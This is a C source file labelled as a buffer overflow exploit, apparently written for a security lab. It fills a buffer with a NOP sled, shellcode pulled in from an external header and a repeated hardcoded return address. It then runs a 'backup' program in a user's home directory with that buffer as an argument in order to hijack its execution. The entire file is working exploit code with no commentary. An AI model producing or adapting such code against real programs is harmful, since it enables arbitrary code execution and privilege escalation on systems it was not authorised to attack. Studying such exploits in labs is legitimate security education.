/* exploit buffer overflow */
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/wait.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdarg.h>
#include "/usr/local/src/shellcode.h"

//#define TARGET "/home/alice/backup"
//#define TARGET "/home/carol/backup"
#define TARGET "/home/david/backup"
//#define TARGET "/home/eve/backup"

#define NOP 0x90
#define BUFFER_SIZE 200
#define EGG_SIZE 400

int main(void) {
	char *buff, *ptr, *args[4], *env[1], *temp;
	int i;
	long *addr_ptr, addr;

	addr = 0xffbfdc90;

	if (!(buff = malloc(EGG_SIZE))) {
		printf ("Can't allocate memory.\n");
	}
	if (!(temp = malloc(EGG_SIZE))) {
		printf ("Can't allocate memory.\n");
	}

	ptr = buff;
	addr_ptr = (long *)ptr;
	for (i=0; i<EGG_SIZE; i+=4) {
		*(addr_ptr++) = addr;
	}

	// 156 = buffer - 18 - 8
	for (i=0; i<156; i++) {
		buff[i] = NOP;
	}

	ptr = buff + (156 - strlen(shellcode)/2);
	for (i=0; i<strlen(shellcode); i++) {
		*(ptr++) = shellcode[i];
	}

//	buff[BUFFER_SIZE-1] = '\0';
	temp[0] = NOP;
	for (i=1; i<EGG_SIZE; i++) {
		temp[i] = buff[i-1];
	}
	temp[EGG_SIZE-1] = '\0';

	args[0] = TARGET;
	args[1] = "backup";
	args[2] = temp;
	args[3] = NULL;

	env[0] = NULL;

	execve(args[0], args, env);

}